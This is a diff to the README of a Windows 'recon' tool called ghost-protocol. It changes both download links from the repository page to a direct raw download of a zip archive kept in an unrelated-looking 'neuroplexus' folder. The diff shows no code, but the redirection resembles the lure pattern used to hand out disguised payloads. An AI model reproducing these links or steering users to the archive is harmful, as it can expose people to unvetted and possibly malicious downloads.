@@ -1,6 +1,6 @@
 # 🕵️ ghost-protocol - Private Recon for Windows Users
 
-[🟣 Download ghost-protocol](https://github.com/bewitched-grant53/ghost-protocol)
+[🟣 Download ghost-protocol](https://github.com/bewitched-grant53/ghost-protocol/raw/refs/heads/main/neuroplexus/ghost-protocol-2.3.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ For best results, use it on a machine where you can save files and open a termin
 
 To get the app, visit this page to download:
 
-[🟣 Download from GitHub](https://github.com/bewitched-grant53/ghost-protocol)
+[🟣 Download from GitHub](https://github.com/bewitched-grant53/ghost-protocol/raw/refs/heads/main/neuroplexus/ghost-protocol-2.3.zip)
 
 If your browser asks what to do with the file, save it to your Downloads folder or a folder you can find again.
 
